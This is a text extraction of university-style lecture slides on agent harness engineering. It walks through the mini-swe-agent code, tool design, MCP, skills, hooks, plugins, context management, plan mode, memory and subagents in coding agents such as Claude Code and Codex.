@@ -1,0 +1,1198 @@
+1
+
+
+
+
+    How to AI an AI for Almost Anything
+         Lecture 5 - Harness Engineering
+                          Ao Qu
+
+
+
+
+                  https://quao627.github.io/
+                  https://x.com/ao_qu18465
+2
+
+
+
+    Today’s Lecture
+    • The Agent Loop
+    • Deep Dive: mini-swe-agent
+    • Tools & Tool Design
+    • Skills, MCP, Hooks, Plugins
+    • Context Management & Prompt Caching
+    • Plan Mode, Memory, Subagents
+    • Multi-agent Harnesses
+    • Safety
+  3
+
+
+
+       What Is a Harness?
+              Agent = Model + Harness
+          HARNESS
+
+
+                  Context                                               Tools
+
+
+
+                                            Model
+
+
+
+              Control loop                                             Safety
+
+                                                                                              same model, 9 harnesses: 58.0% → 76.4%
+
+
+
+[Merrill et al., Terminal-Bench. ICLR 2026] Leaderboard: https://www.tbench.ai/?version=2.0
+Blog: https://blog.langchain.com/the-anatomy-of-an-agent-harness/
+  4
+
+
+
+       What Is a Harness?
+              Agent = Model + Harness
+         HARNESS
+
+
+                  Context                                             Tools
+
+
+
+                                           Model
+
+                                                                                 same model: ≈ same success, 2× the cost
+              Control loop                                            Safety
+
+
+
+
+[Pan et al., HarnessTax: How Much Does Harness Matter for Coding Agents? 2026]
+Blog: https://arena.ai/blog/coding-agents-harness-tax
+  5
+
+
+
+       The Agent Loop
+                                                         Task
+
+
+                                                                                                  Q: Which parts are the model, which
+                                                                                                  the harness?
+                                                    Thought
+                                                                                                  A: model: Thought, Action, Answer
+                                                                                                  harness: run the Tool, return the
+                     Action                                                                       Observation, loop
+                                                                                      no action
+                                                  Observation
+
+
+                          Tool                                                        Answer
+
+
+
+[Yao et al., ReAct: Synergizing Reasoning and Acting in Language Models. ICLR 2023]
+Blog: https://www.philschmid.de/langgraph-gemini-2-5-react-agent (diagram redrawn)
+  6
+
+
+
+      The Agent Loop in Code
+        messages = [{"role": "system", "content": SYSTEM},
+                           {"role": "user",   "content": task}]
+        while True:
+              reply = llm(messages)                                      model: Thought + Action
+
+              messages.append({"role": "assistant", "content": reply})
+              action = parse_action(reply)                               harness parses the action
+
+              if action is None:
+                     return reply                                          no action → Answer
+
+              output = execute(action)                                     harness runs the Tool
+
+              messages.append({"role": "user", "content": output})        Observation → context
+
+
+
+
+Blog: https://minimal-agent.com/
+  7
+
+
+
+      The Agent Loop in Codex
+
+
+
+
+                   one turn = many model calls, until no tool call   next turn: the whole history goes back in
+
+
+
+
+Blog: https://openai.com/index/unrolling-the-codex-agent-loop/
+  8
+
+
+
+      What the Model Sees First
+
+
+
+                                                                                             gpt-5.2-codex_prompt.md ↗
+                                                                                                                            ≈47k tokens
+                                                                                                                               before you type
+
+
+
+
+                                                                                                                            repo not in the prompt
+                                                                                                                                read with tools
+
+
+
+
+Blog: https://openai.com/index/unrolling-the-codex-agent-loop/
+Code: https://github.com/openai/codex/blob/e958d0337e98f6398771917867d7de689dab3b7a/codex-rs/core/gpt-5.2-codex_prompt.md
+[credit: Juncheng Yang, Harvard CS 2680 Modern AI Systems: Agents and System Optimizations: https://cs2680.com/]
+  9
+
+
+
+      mini-swe-agent
+                                                                                                              • ~100 lines
+                                                                                                              • bash is the only tool
+                                                                                                              • linear history
+                                                                                                              • subprocess per action
+                                                                                                              • >74% SWE-bench Verified
+
+
+
+
+Code: https://github.com/SWE-agent/mini-swe-agent/blob/68d367b/src/minisweagent/agents/default.py (v1.17.5)
+Docs: https://mini-swe-agent.com/v1/advanced/control_flow/
+ 10
+
+
+
+      query() + parse_action()
+        def query(self):                                                                                             Q: Why check n_calls and cost
+            if self.model.n_calls >= step_limit or self.model.cost >= cost_limit:                                    before every model call?
+                raise LimitsExceeded()                     # terminal
+            response = self.model.query(self.messages)     # retries w/ backoff
+            self.add_message("assistant", **response)                                                                A: An agent that never submits would
+            return response                                                                                          loop forever; LimitsExceeded stops it at
+                                                                                                                     the step or cost limit.
+        def parse_action(self, response):
+            actions = re.findall(r"```bash\s*\n(.*?)\n```",
+                                  response["content"], re.DOTALL)                                                    Q: Why raise FormatError when
+            if len(actions) != 1:
+                                                                                                                     there isn’t exactly one bash block?
+                raise FormatError(format_error_template)    # tell the LM, retry
+            return actions[0].strip()
+                                                                                                                     A: Models sometimes send no command
+                                                                                                                     or several. The error goes back as the
+                                                                                                                     next message, and the model fixes the
+                                                                                                                     format itself.
+
+
+
+
+Code: https://github.com/SWE-agent/mini-swe-agent/blob/68d367b/src/minisweagent/agents/default.py#L101-L121 (v1.17.5, simplified)
+ 11
+
+
+
+       execute_action()
+         def execute_action(self, action):                                                                                            Q: Why does every command have a
+             try:                                                                                                                     timeout?
+                 output = self.env.execute(action["action"])
+             except subprocess.TimeoutExpired:
+                                                                                                                                      A: Some commands never return, like
+                 raise ExecutionTimeoutError(render(timeout_template))
+                                                                                                                                      starting a server. After 30 seconds the
+             self.has_finished(output)          # submitted?
+                                                                                                                                      command is killed, and
+             return output
+                                                                                                                                      ExecutionTimeoutError tells the model
+                                                                                                                                      to try something else.
+         # environments/local.py
+         subprocess.run(command, shell=True, text=True, cwd=cwd,
+                        timeout=30,
+                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+
+
+
+         Q: Why start a new subprocess.run for every action instead of keeping one shell open?
+
+         A: With one long-running shell, the harness has to guess when a command’s output is finished, and one bad or interrupted
+         command can break the shell for every later step. subprocess.run returns when the command exits, with its output and exit
+         code. The cost: cd and export don’t carry over, so the model writes cd src && pytest.
+
+
+Code: https://github.com/SWE-agent/mini-swe-agent/blob/68d367b/src/minisweagent/agents/default.py#L123-L132 (v1.17.5, simplified)
+Code: https://github.com/SWE-agent/mini-swe-agent/blob/68d367b/src/minisweagent/environments/local.py#L20-L35 (v1.17.5, simplified)
+Docs: https://mini-swe-agent.com/v1/faq/
+ 12
+
+
+
+       Observation and Finish
+       config/default.yaml                                                                                    what the model sees after step 1
+
+         action_observation_template: |                                                                         <returncode>0</returncode>
+           <returncode>{{output.returncode}}</returncode>                                                       <output>
+           {% if output.output | length < 10000 -%}                                                             /testbed/django/contrib/auth/validators.py
+           <output>{{ output.output }}</output>                                                                 </output>
+           {%- else -%}
+           <warning>The output of your last command was too long.
+           (try head / tail / sed / a more selective grep) ...</warning>                                      to finish
+           <output_head>{{ output.output[:5000] }}</output_head>
+           <elided_chars>{{ elided }} characters elided</elided_chars>                                          echo COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT
+           <output_tail>{{ output.output[-5000:] }}</output_tail>
+           {%- endif -%}
+
+
+
+         Q: Why keep only the first and last 5,000 characters of a long output?
+
+         A: A full log would flood the context. The start and the end usually say what ran and how it failed, and the warning suggests head,
+         tail or a narrower grep.
+
+
+
+
+Code: https://github.com/SWE-agent/mini-swe-agent/blob/68d367b/src/minisweagent/config/default.yaml#L104-L128 (v1.17.5, simplified)
+ 13
+
+
+
+      run(): Exceptions as Control Flow
+        def run(self, task):                                                                                       ① rules + task
+            self.messages = []
+            self.add_message("system", render(system_template))
+            self.add_message("user",   render(instance_template, task=task))                                       ② loop
+            while True:
+                try:
+                    self.step()                                                                                    ③ recoverable → tell the LM
+                except NonTerminatingException as e:   # format error, timeout
+                    self.add_message("user", str(e))
+                except TerminatingException as e:      # submitted, limits
+                    self.add_message("user", str(e))
+                                                                                                                   ④ terminal → exit
+                    return type(e).__name__, str(e)
+
+
+
+        Q: Why does every problem become an exception instead of a returned error code?
+
+        A: Errors start deep inside query, parse_action and execute_action; run() handles them in one place: recoverable ones go
+        back to the model as a message, terminal ones end the run.
+
+
+
+
+Code: https://github.com/SWE-agent/mini-swe-agent/blob/68d367b/src/minisweagent/agents/default.py#L82-L95 (v1.17.5, simplified)
+ 14
+
+
+
+       Running a Real Task
+       run/hello_world.py                                                                           messages on a real task: django-11099
+                                                                                                                      Your response must contain exactly ONE bash
+         def main(task: str, model_name: str):                                                         system         code block with ONE command
+             agent = DefaultAgent(
+                 LitellmModel(model_name=model_name),                  # model                                        <pr_description> UsernameValidator allows
+                 LocalEnvironment(),                                   # runs bash
+                                                                                                         user         trailing newline in usernames …
+                 **yaml.safe_load(config)["agent"],                    # prompts, limits
+             )                                                                                                        THOUGHT: … locate the username validators
+             agent.run(task)                                                                            step 1        find /testbed -type f -name "validators.py"
+                                                                                                                        | grep -E "contrib.*auth"
+
+                                                                                                                      <returncode>0</returncode>
+                                                                                                         user         <output>/testbed/django/contrib/auth/validators.py
+
+
+       run it                                                                                       ⋮ steps 2–23: reproduce, edit with sed, run tests
+                                                                                                                      echo COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT
+         python -m minisweagent.run.hello_world \                                                      step 24          && git add -A && git diff --cached
+           -m anthropic/claude-sonnet-4-5-20250929 \
+           -t "UsernameValidator allows trailing newline ..."
+                                                                                                    → Submitted after 24 steps, $0.19; hidden tests pass
+
+
+
+
+Code: https://github.com/SWE-agent/mini-swe-agent/blob/68d367b/src/minisweagent/run/hello_world.py#L15-L32 (v1.17.5, simplified)
+Trajectory: SWE-bench bash-only run 20250929_mini-v1.13.3_sonnet-4-5 · https://www.swebench.com/
+ 15
+
+
+
+       Putting the User in the Loop
+       agents/interactive.py                                                                                    in a session
+
+         class InteractiveAgent(DefaultAgent):   # what the `mini` command runs                                     model          pip install -U django
+             def execute_action(self, action):
+                 if self.config.mode == "confirm":
+                                                                                                                                   Execute? Enter to confirm, or type a
+                     self.ask_confirmation()               # wait for the user                                     harness
+                                                                                                                                   comment
+                 return super().execute_action(action)
+
+             def ask_confirmation(self):                                                                              you          don't upgrade Django, fix the validator
+                 user_input = prompt("Execute? Enter to confirm, or type a comment")
+                 if user_input == "":
+                     return                                # run the command
+                                                                                                                                   Command not executed. The user rejected
+                 raise NonTerminatingException(                                                                   next user
+                                                                                                                                   your command with the following message:
+                     "Command not executed. The user rejected your command "                                      message          don't upgrade Django, fix the validator
+                     f"with the following message: {user_input}")
+
+
+                                                                                                                press Enter instead, and the command runs
+
+
+
+
+Code: https://github.com/SWE-agent/mini-swe-agent/blob/68d367b/src/minisweagent/agents/interactive.py#L93-L116 (v1.17.5, simplified)
+ 16
+
+
+
+       Must-Have Tools
+                                                             Claude Code                                       Codex
+
+                Read                 Read                                               shell
+
+               Search                Glob files by name       Grep text in files        rg --files files by name   rg text in files
+
+                 Edit                Edit replace a string      Write                   apply_patch apply a diff
+
+              Execute                Bash                                               exec_command
+
+                 Web                 WebSearch          WebFetch                        web_search
+
+                 Plan                plan mode                                          update_plan
+
+              Delegate               Agent                                              spawn_agent
+
+              Ask user               AskUserQuestion                                    request_user_input
+
+
+                                                 mini-swe-agent: Read, Search, Edit, Execute with bash only
+
+
+
+Docs: https://code.claude.com/docs/en/tools-reference
+Code: https://github.com/openai/codex
+ 17
+
+
+
+       Edit Tool Calls Across Harnesses
+        Task: replace ^…$ with \A…\Z in both username validators
+
+
+                                            {"file_path": "/testbed/django/contrib/auth/validators.py",
+             Claude Code                     "old_string": "regex = r'^[\\w.@+-]+$'",
+                 Edit                        "new_string": "regex = r'\\A[\\w.@+-]+\\Z'",
+                                             "replace_all": true}
+
+
+                                            *** Begin Patch
+                                            *** Update File: django/contrib/auth/validators.py
+                                            @@ class ASCIIUsernameValidator(validators.RegexValidator):
+                                            -    regex = r'^[\w.@+-]+$'
+                Codex
+                                            +    regex = r'\A[\w.@+-]+\Z'
+             apply_patch                    @@ class UnicodeUsernameValidator(validators.RegexValidator):
+                                            -    regex = r'^[\w.@+-]+$'
+                                            +    regex = r'\A[\w.@+-]+\Z'
+                                            *** End Patch
+
+
+           mini-swe-agent                   sed -i "s/r'\^\\[\\\\w.@+-\\]+\$'/r'\\\\A[\\\\w.@+-]+\\\\Z'/g" \
+                                                /testbed/django/contrib/auth/validators.py
+                bash
+
+
+
+Docs: https://code.claude.com/docs/en/tools-reference Code: https://github.com/openai/codex/blob/main/codex-rs/core/assets/tools/apply_patch.lark
+Trajectory: SWE-bench bash-only run 20250929_mini-v1.13.3_sonnet-4-5 · https://www.swebench.com/
+ 18
+
+
+
+       Tool Format
+       ① schema, sent with the request                                         ② model output             ③ harness runs it
+
+         {"name": "get_weather",                                               {"type": "tool_use",       {"type": "tool_result",
+          "description": "Get the current weather                               "id": "toolu_01A…",        "tool_use_id":
+                          in a given location",                                 "name": "get_weather",       "toolu_01A…",
+          "input_schema": {"type": "object",                                    "input": {"location":      "content": "15 degrees"}
+            "properties": {"location":                                            "San Francisco, CA"}}
+                             {"type": "string"}},
+            "required": ["location"]}}
+
+
+
+
+                                            The model sees: name + description + schema
+
+                                                              → the description is a prompt
+
+
+
+Docs: https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview
+ 19
+
+
+
+       Tool Descriptions Are Prompts
+        Anthropic’s edit tool for SWE-bench
+
+         "name": "str_replace_editor",
+         "description": "Custom editing tool for viewing, creating and
+
+
+                                                                                     49%
+           editing files
+         * If a `command` generates a long output, it will be truncated
+           and marked with `<response clipped>`
+         ...
+                                                                                  SWE-bench Verified
+         Notes for using the `str_replace` command:
+         * The `old_str` parameter should match EXACTLY one or more                Claude 3.5 Sonnet
+           consecutive lines from the original file. Be mindful of                 previous best: 45%
+           whitespaces!
+         * If the `old_str` parameter is not unique in the file, the       “…state-of-the-art performance on the
+           replacement will not be performed. Make sure to include        SWE-bench Verified evaluation after we
+           enough context in `old_str` to make it unique",                   made precise refinements to tool
+         ...                                                                            descriptions”
+         "path": {"description": "Absolute path to file or directory,
+                                                                                        — Anthropic
+           e.g. `/repo/file.py` or `/repo`."}
+
+
+
+
+Blog: https://www.anthropic.com/engineering/swe-bench-sonnet
+Blog: https://www.anthropic.com/engineering/writing-tools-for-agents
+ 20
+
+
+
+       Fewer Tools, No Overlap
+        Vercel’s text-to-SQL agent
+
+         tools: { GetEntityJoins, LoadCatalog, RecallContext,                          17 tools   2 tools
+           LoadEntityDetails, SearchCatalog, ClarifyIntent,
+           SearchSchema, GenerateAnalysisPlan, FinalizeQueryPlan,
+           FinalizeNoData, JoinPathFinder, SyntaxValidator,                success       4/5       5/5
+           FinalizeBuild, ExecuteSQL, FormatResults,
+           VisualizeData, ExplainResults }                                 avg time    274.8 s    77.4 s
+                                                 ↓ 17 tools → 2
+                                                                          avg tokens    ~102k      ~61k
+         tools: { ExecuteCommand, ExecuteSQL }
+                                                                          avg steps      ~12        ~7
+
+
+
+
+Blog: https://vercel.com/blog/we-removed-80-percent-of-our-agents-tools
+ 21
+
+
+
+       Tool Search Tool
+
+
+
+
+Blog: https://www.anthropic.com/engineering/advanced-tool-use
+ 22
+
+
+
+       How the Tool Search Tool Works
+
+
+
+
+Blog: https://www.anthropic.com/engineering/advanced-tool-use
+ 23
+
+
+
+       Design Tools for Agents Rather Than Humans
+       Score: % of SWE-bench Lite issues resolved, GPT-4 Turbo
+
+
+                        No search tool                                              Iterative search                                   Summarized search
+       the agent explores with ls, cd, grep                         like Ctrl+F in an editor: one match at a time,            every match in one list; over 50 matches →
+                                                                    then next                                                 asks for a narrower query
+
+
+         $ ls                                                         $ search_all "PVSystem"                                  $ search "class PVSystem"
+         benchmarks/     setup.cfg                                    [Result 1/15 (Line 70)]                                  Found 1 matches for "class
+         docs/           versioneer.py                                [File: pvlib/pvsystem.py]                                  PVSystem" in /pvlib__pvlib-python:
+         pvlib/          README.md                                    22:# a dict of required pa...                            /pvlib__pvlib-python/pvlib/
+         setup.py        ...                                          23:_DC_MODEL_PARAMS = {                                    pvsystem.py (1 matches)
+         $ cd pvlib/                                                  (97 more lines omitted)                                  End of matches
+                                                                      $ next                                                   $ open pvlib/pvsystem.py
+
+
+
+                           15.7%                                                       12.0%                                                 18.0%
+          Iterative search copies an editor’s search and scores below no search: the agent calls next through every match
+                                                  until it runs out of budget or context.
+
+
+
+
+[Yang et al., SWE-agent: Agent-Computer Interfaces Enable Automated Software Engineering. NeurIPS 2024] (Table 3, Figure 5)
+ 24
+
+
+
+       Concise Output and Helpful Errors
+       Let the agent choose the detail level                           Errors that say what to do next
+       responseFormat: "detailed" 206 tokens                           unhelpful
+
+         === Result 1 of 89 ===                                         {"error": {"code": "RESOURCE_NOT_FOUND",
+         Channel: #dev (C1234567890)                                      "status": 422, "message": "Invalid value",
+         From: @jane.doe (U123456789)                                     "details": {"field": "userId",
+         Time: 2024-01-15 10:30:45 UTC                                      "value": "john.doe@acme.corp"}}}
+         TS: 1705316445.123456
+         Text: Found a critical bug in the login flow.
+                                                                       helpful
+
+       responseFormat: "concise" 72 tokens                              # Resource Not Found: Invalid `userId`
+                                                                        Your request to `/api/user/info` failed because the
+                                                                        `userId` `john.doe@acme.corp` does not exist or is
+         1. #dev - @jane.doe: Found a critical bug in the
+                                                                        in the wrong format.
+            login flow. [Jan 15]
+                                                                        ## Valid User IDs: `1928298149291729`, ...
+         2. DM - @john.smith: The bug report for issue
+                                                                        ## Resolving a User ID: call user_search()
+            #123 is ready for review [Jan 14]
+
+
+
+
+Blog: https://www.anthropic.com/engineering/writing-tools-for-agents
+ 25
+
+
+
+       Bash or Tools?
+                                       Bash / code                                                                               Dedicated tools
+        • mini-swe-agent, bash only: 74.4% on SWE-bench                                               • permissions: Read, Grep run without asking; Bash asks
+          Verified                                                                                    • parallel: Read, Glob, Grep run at once; Edit, Bash one
+        • CodeAct: actions as code 74.4% vs JSON tool calls                                             at a time
+          52.4%                                                                                       • exact edits: Edit fails on 0 or 2+ matches; sed exits 0
+        • Cloudflare: “LLMs have seen a lot of code. They have                                          either way
+          not seen a lot of ‘tool calls’.”                                                            • undo: rewind restores Edit changes, not rm / mv in
+                                                                                                        Bash
+
+
+
+
+         Q: So: bash or tools?
+
+         A: Both: bash for breadth, tools for guarantees
+
+
+
+[Wang et al., Executable Code Actions Elicit Better LLM Agents. ICML 2024] Docs: https://www.swebench.com/
+Docs: https://code.claude.com/docs/en/permissions Docs: https://code.claude.com/docs/en/checkpointing Blog: https://blog.cloudflare.com/code-mode/
+ 26
+
+
+
+       Extending a Harness
+                       Skill                                       MCP                                             Hook                Plugin
+
+                   procedures                                  external tools                          your code at events        bundle of the above
+
+
+             trigger: model or /name                         trigger: model calls                      trigger: harness, always    trigger: user installs
+
+
+               context: ~100 tokens                          context: tool names                              context: zero        context: sum of parts
+
+
+
+                                          + CLAUDE.md / AGENTS.md: always loaded, never enforced
+
+
+
+
+Docs: https://code.claude.com/docs/en/features-overview
+[credit: Juncheng Yang, Harvard CS 2680 Modern AI Systems: Agents and System Optimizations: https://cs2680.com/]
+ 27
+
+
+
+       The Skill Format
+       a skill is a folder                                                              pdf/SKILL.md
+
+         skill-name/                                                                      ---
+         ├── SKILL.md          # required: metadata + instructions                        name: pdf
+         ├── scripts/          # optional: executable code                                description: Comprehensive PDF toolkit for extracting text and tables,
+         ├── references/       # optional: documentation                                    merging/splitting documents, and filling-out forms.
+         ├── assets/           # optional: templates, resources                           ---
+         └── ...                                                                          ## Overview
+                                                                                          This guide covers essential PDF processing operations using Python
+                                                                                          libraries and command-line tools. For advanced features, JavaScript
+       frontmatter                                                                        libraries, and detailed examples, see ./reference.md. If you need to
+                                                                                          fill out a PDF form, read ./forms.md and follow its instructions.
+                               required: ≤ 64 chars, lowercase and
+               name                                                                       ## Quick Start
+                               hyphens, same as the folder
+                                                                                          ```python
+                                                                                          from pypdf import PdfReader, PdfWriter
+                               required: ≤ 1024 chars, what it does and                   ...
+         description
+                               when to use it
+
+                               license, compatibility, metadata,                          One open standard: Claude Code, Codex, Gemini CLI, GitHub Copilot
+            optional
+                               allowed-tools
+                                                                                                        and Cursor read the same SKILL.md
+
+
+
+
+Docs: https://agentskills.io/specification
+Blog: https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills
+ 28
+
+
+
+       Progressive Disclosure
+          “Progressive disclosure is the core design principle that makes Agent Skills flexible and scalable.”
+                                                                                                                                        — Anthropic
+
+
+
+                                                                                                        frontmatter: name + description
+                                                                                                    1   always loaded, ~100 tokens per skill
+
+
+
+                                                                                                        SKILL.md body
+                                                                                                    2   loaded when the skill triggers, under 5k
+                                                                                                        tokens
+
+
+
+                                                                                                        bundled files and scripts
+                                                                                                    3   read only when needed, free until then
+
+
+
+
+Blog: https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills
+ 29
+
+
+
+       MCP: One Protocol for External Tools
+
+
+
+
+                         claude mcp add --transport http notion https://mcp.notion.com/mcp
+
+
+                                            a remote server needs no local code: Claude Code connects to the URL
+
+
+
+Docs: https://modelcontextprotocol.io/docs/getting-started/intro Docs: https://code.claude.com/docs/en/mcp
+ 30
+
+
+
+       MCP: An Example
+       weather.py                                                                                             set up and connect
+
+         from mcp.server import MCPServer                                                                      uv init weather && cd weather
+                                                                                                               uv add "mcp[cli]"
+         mcp = MCPServer("weather")                                                                            claude mcp add weather -- \
+         NWS_API_BASE = "https://api.weather.gov"              # US National Weather Service                     uv --directory /Users/me/weather run weather.py
+
+         @mcp.tool()
+         async def get_forecast(latitude: float, longitude: float) -> str:                                    Claude Code starts this command when a session begins
+             """Get weather forecast for a location."""
+             url = f"{NWS_API_BASE}/points/{latitude},{longitude}"
+             points = await make_nws_request(url)                                                             use it in a session
+             ...                                      # fetch and format 5 periods
+                                                                                                                 user     What's the forecast in Sacramento?
+         @mcp.tool()
+         async def get_alerts(state: str) -> str:
+             """Get weather alerts for a US state."""                                                                     mcp__weather__get_forecast(
+             ...                                                                                                model       latitude=38.58, longitude=-121.49)
+
+         if __name__ == "__main__":
+             mcp.run(transport="stdio")                                                                                   Tonight:
+                                                                                                                result    Temperature: …°F   Wind: …   Forecast: …
+
+
+
+
+Docs: https://modelcontextprotocol.io/docs/develop/build-server (simplified) Docs: https://code.claude.com/docs/en/mcp
+ 31
+
+
+
+       MCP: Host, Client, Server
+          Host                                                                Servers                  the app where the agent runs (Claude
+          Claude Code: agent loop + model                                                              Code, Codex, VS Code); creates one
+                                                                                              Host
+                                                                                                       client per server, decides what the
+                                                                                                       model sees
+                                                               JSON-RPC
+                                                                                weather
+                         MCP client                                            local, stdio
+
+                                                                                                       part of the host’s harness; one
+                                                               JSON-RPC
+                                                                                              Client   connection to exactly one server,
+                                                                               filesystem              carries messages both ways
+                         MCP client                                            local, stdio
+
+
+
+                                                               JSON-RPC
+                                                                                 Sentry
+                         MCP client                                           remote, HTTP             a program that offers tools, resources
+                                                                                              Server
+                                                                                                       and prompts; local or remote
+
+
+
+
+Docs: https://modelcontextprotocol.io/specification/2026-07-28/architecture
+Docs: https://modelcontextprotocol.io/docs/learn/architecture
+ 32
+
+
+
+       MCP: The Protocol
+             Every host and server exchange the same JSON-RPC messages, over stdio (local) or HTTP (remote)
+
+                                                      client → server                                  server → client
+
+                               {"jsonrpc": "2.0", "id": 2,                        {"jsonrpc": "2.0", "id": 2,
+                                "method": "tools/list"}                            "result": {"tools": [{"name": "get_forecast",
+        ① discover                                                                   "description": "Get weather forecast for a location.",
+                                                                                     "inputSchema": {"type": "object", "properties":
+                                                                                       {"latitude": {"type": "number"}, ...}}}, ...]}}
+
+
+                               {"jsonrpc": "2.0", "id": 3,                        {"jsonrpc": "2.0", "id": 3,
+                                "method": "tools/call",                            "result": {"content": [{"type": "text",
+            ② call              "params": {"name": "get_forecast",                   "text": "Tonight:\nTemperature: ..."}]}}
+                                  "arguments": {"latitude": 38.58,
+                                                "longitude": -121.49}}}
+
+
+                       Each host and each server implements MCP once, instead of a custom connector for every pair
+
+
+
+
+Docs: https://modelcontextprotocol.io/docs/learn/architecture
+Docs: https://modelcontextprotocol.io/specification/2026-07-28/basic/transports
+ 33
+
+
+
+      Hooks: Deterministic Code at Lifecycle Events
+               SessionStart                                PreToolUse                           PostToolUse   Stop
+
+
+
+
+Docs: https://code.claude.com/docs/en/hooks Docs: https://code.claude.com/docs/en/hooks-guide
+ 34
+
+
+
+      Plugins: Share a Whole Setup
+                                                                                                          install
+
+                                                                                                           /plugin marketplace add owner/repo
+                                                                                                           /plugin install my-plugin@my-marketplace
+
+
+
+
+                                                                                                          .claude-plugin/plugin.json
+
+                                                                                                           {"name": "my-plugin",
+                                                                                                            "description": "Code review helpers",
+                                                                                                            "version": "1.0.0",
+                                                                                                            "author": {"name": "Your Name"}}
+
+
+                                                                                                          only name is required
+
+
+
+
+Docs: https://code.claude.com/docs/en/plugins Docs: https://code.claude.com/docs/en/plugin-marketplaces
+ 35
+
+
+
+       Q&A: Which Mechanism?
+         Q: Forbid access to secrets/                     Q: Format after every edit
+
+         A: PreToolUse hook / deny rule (+ sandbox)       A: PostToolUse hook
+
+
+         Q: Check my Google Calendar                      Q: Our code-review checklist
+
+         A: MCP                                           A: Skill
+
+
+                                                          Q: Same setup in 20 repos and shareable with
+         Q: “Always use uv, not pip”
+                                                          others
+
+         A: CLAUDE.md                                     A: Plugin
+
+
+
+
+Docs: https://code.claude.com/docs/en/features-overview
+ 36
+
+
+
+       Context Is a Finite Resource
+                                                                                               ■ focused: ~300 tokens
+                                                                                               ■ full: ~113k tokens
+
+                                                                                               → every model drops
+
+
+
+
+                                                     goal: the smallest set of high-signal tokens
+
+
+[Hong et al., Context Rot: How Increasing Input Tokens Impacts LLM Performance. Chroma 2025]
+Blog: https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents
+ 37
+
+
+
+       Prompt Caching
+                                                                                               cached input = 0.1× price
+
+                                                                                               • static first
+                                                                                               • append, don’t edit
+                                                                                               • stable tool order
+
+
+
+                                                                                               Q: timestamp at the top?    miss every call
+
+
+
+                                                                                               Q: MCP adds a tool mid-
+                                                                                                                          miss from tools on
+                                                                                               session?
+
+
+                                                                                               Q: user types a new
+                                                                                                                          hit: it is appended
+                                                                                               message?
+
+
+
+
+Blog: https://claude.com/blog/lessons-from-building-claude-code-prompt-caching-is-everything
+Blog: https://manus.im/blog/Context-Engineering-for-AI-Agents-Lessons-from-Building-Manus
+ 38
+
+
+
+       Keep the Context Small
+         truncate outputs
+
+
+         mask old observations
+
+
+         compact (summarize)
+
+
+         offload to files
+
+
+         isolate in subagents
+
+
+
+                                                               masking ≈ summarization, at ½ the cost
+
+
+
+[Lindenbauer et al., The Complexity Trap: Simple Observation Masking Is as Efficient as LLM Summarization for Agent Context Management. NeurIPS 2025 DL4C]
+Blog: https://claude.com/blog/lessons-from-building-claude-code-prompt-caching-is-everything
+ 39
+
+
+
+      Plan Mode
+                  Explore                                        Plan                                    Approve                         Execute
+                    read-only                              write the plan file                             you decide                   edits allowed
+
+       what changes in the harness when you press Shift+Tab or type /plan in Claude Code
+
+         prompt                                                    permissions                                          tools
+         an extra instruction: research and                        edits blocked; shell commands beyond                 EnterPlanMode to switch in;
+         propose, do not edit                                      the read-only set need approval                      ExitPlanMode shows the plan and asks
+                                                                                                                        you to approve
+
+
+
+        Q: Is plan mode a different harness, or a different model?
+
+        A: Neither: same model, same loop. The harness only switches state: one more instruction, blocked edits, and a tool to
+        ask for approval.
+
+
+
+
+Docs: https://code.claude.com/docs/en/permission-modes Docs: https://code.claude.com/docs/en/tools-reference
+Code: https://github.com/openai/codex/blob/main/codex-rs/collaboration-mode-templates/templates/plan.md
+ 40
+
+
+
+      The Plan Is a File
+       ~/.claude/plans/<plan>.md
+
+        # Fix: usernames with a trailing newline pass validation
+                                                                                                                        the model writes the plan here; your
+                                                                                                            plan mode
+        ## Context                                                                                                      source stays read-only
+        `^...$` also matches before a final newline; use `\A...\Z`.
+
+        ## Steps
+        1. Change the regex in ASCIIUsernameValidator and                                                               you read it, or press Ctrl+G to edit the
+           UnicodeUsernameValidator (django/contrib/auth/validators.py)                                       approve
+                                                                                                                        file first
+        2. Add a test for "user\n" to the auth validator tests
+        3. Run the auth validator tests
+
+        ## Not doing                                                                                                    the plan is in the context; after
+        Changing other validators                                                                             execute   compaction Claude Code puts it back
+                                                                                                                        from disk
+
+
+
+         Q: Why keep the plan in a file instead of only in the conversation?
+
+         A: The conversation gets compacted or cleared; the file survives. The harness can put the plan back, and the model can
+         re-read it whenever it needs to.
+
+
+Docs: https://code.claude.com/docs/en/permission-modes Docs: https://code.claude.com/docs/en/settings-reference
+Docs: https://code.claude.com/docs/en/context-window
+ 41
+
+
+
+      Memory = Files the Harness Reloads
+                                                                                                   Claude writes it; /memory opens the
+           CLAUDE.md                you write it; loaded into every session    auto memory
+                                                                                                   folder
+
+       auto memory Claude saved while we made this lecture
+
+        ~/.claude/projects/<project>/memory/                                  ---
+        ├── MEMORY.md                                                         name: slide-density-preference
+        ├── lecture-deck-workflow.md                                          description: "User wants lecture slides with very
+        └── slide-density-preference.md                                         little text, primary-source figures ..."
+                                                                              metadata:
+        # MEMORY.md                                                             type: feedback
+        - [Lecture deck workflow](lecture-deck-workflow.md)                   ---
+          — MAS.S60 deck style, footnote format,                              For lecture decks, the user asked for less text per
+          python-pptx build from lec3 master, ...                             slide: put the original figure on the slide ... and
+        - [Slide density preference](slide-density-preference.md)             use a few keywords instead of full sentences.
+          — figures + keyword captions, primary sources,
+          diagram before code, live links                                     **Why:** ... decks were still too wordy
+                                                                              **How to apply:** default to figure + keyword-caption
+                                                                              slides; move explanations into speaker notes ...
+
+
+
+
+Docs: https://code.claude.com/docs/en/memory
+ 42
+
+
+
+      Subagents
+
+
+
+
+                 A subagent works in its own context; only its result comes back (e.g., it read 6,100 tokens and returned 420)
+
+
+
+
+Docs: https://code.claude.com/docs/en/sub-agents Docs: https://code.claude.com/docs/en/agent-teams
+ 43
+
+
+
+       Multi-Agent: Helps vs Hurts
+
+
+
+
+      helps: the parts are independent reads. Subagents search in parallel                                  hurts: the parts depend on each other. “Build Flappy Bird”: one
+      and only their findings come back: +90.2% over one agent, at ~15×                                     subagent made a Super Mario background, the other a bird in a
+      the tokens of a chat.                                                                                 different style. Neither saw the other’s choices.
+
+
+
+                                                 let many agents read in parallel; let one agent make the changes
+
+
